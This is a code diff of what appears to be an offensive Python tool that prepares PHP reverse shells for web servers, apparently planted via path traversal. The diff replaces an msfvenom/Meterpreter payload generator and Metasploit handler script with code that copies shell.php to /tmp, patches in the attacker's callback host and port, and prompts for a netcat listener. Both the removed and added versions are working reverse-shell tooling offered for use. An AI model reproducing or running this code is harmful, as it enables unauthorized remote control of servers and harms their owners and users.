@@ -1,27 +1,15 @@
-import random
-import string
-import subprocess
 import sys
-
+from os.path import dirname, abspath, join
+from shutil import copy2
 import requests
 
 PATH_TRAVERSAL = ['../', '..\\', '/../', './../']
+HERE = dirname(abspath(__file__))
+
+SHELL = join(HERE, "shell.php")
 
 
-class Generator:
-    """generate random name for the shell
-    """
-
-    def __init__(self, size=8, chars=string.ascii_lowercase + string.digits):
-        self.size = size
-        self.chars = chars
-
-    def generate(self):
-        value = ''.join(random.choice(self.chars) for _ in range(self.size))
-        return value
-
-
-class Payload:
+class listener:
     """Generate payload that could be used by Metasploit
     """
 
@@ -30,47 +18,34 @@ class Payload:
         self.lport = lport
 
     def handler(self):
-        opt = "use multi/handler\n"
-        opt += "set payload php/meterpreter/reverse_tcp\n"
-        opt += "set LHOST {0}\n set LPORT {1}\n".format(self.lhost, self.lport)
-        opt += "set ExitOnSession false\n"
-        opt += "exploit -j\n"
-        with open("php_listener.rc", "w") as f:
-            f.write(opt)
-        print(colors("[+] Generated Metasploit Resource File", 92))
-        print(colors("[~] Load Metasploit: msfconsole -r php_listener.rc", 93))
+        print(colors("[~] Start your listener by running",93), end="")
+        print(colors(" nc -ntlp {}".format(self.lport),91))
 
 
 def msf_payload():
     """Use msfvenom to generate reverse shell payload
     """
-
+    filepath = "/tmp/shell.php"
     lhost = input(colors("[?] Host For Callbacks: ", 94))
     lport = input(colors("[?] Port For Callbacks: ", 94))
 
-    g = Generator()
-    shell = g.generate()
+    print(colors("[~] Generating PHP listener", 93))
 
-    print(colors("[~] Generating Metasploit Payload", 93))
+    copy2(SHELL, filepath)
 
-    # TODO: Check if msfvenom exists or not
-    php = "/usr/bin/msfvenom -a php --platform php -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f raw > /tmp/{2}.php".format(  # noqa
-        lhost, lport, shell)
+    with open(filepath, 'r') as f:
+        payload = f.read()
 
-    try:
-        msf = subprocess.Popen(php, shell=True)
-        msf.wait()
-        if msf.returncode != 0:
-            print(colors("[!] Error Generating MSF Payload ", 91))
-            sys.exit(1)
-        else:
-            print(colors("[+] Success! ", 92))
-            print(colors("[~] Payload: /tmp/{0}.php", 93).format(shell))
+    payload = payload.replace("127.0.0.1", lhost)
+    payload = payload.replace("4444", lport)
 
-    except OSError as e:
-        print(e)
+    with open(filepath, 'w') as f:
+        f.write(payload)
 
-    return lhost, lport, shell
+    print(colors("[+] Success! ", 92))
+    print(colors("[~] listener: /tmp/shell.php", 93))
+
+    return lhost, lport, "shell"
 
 
 def colors(string, color):
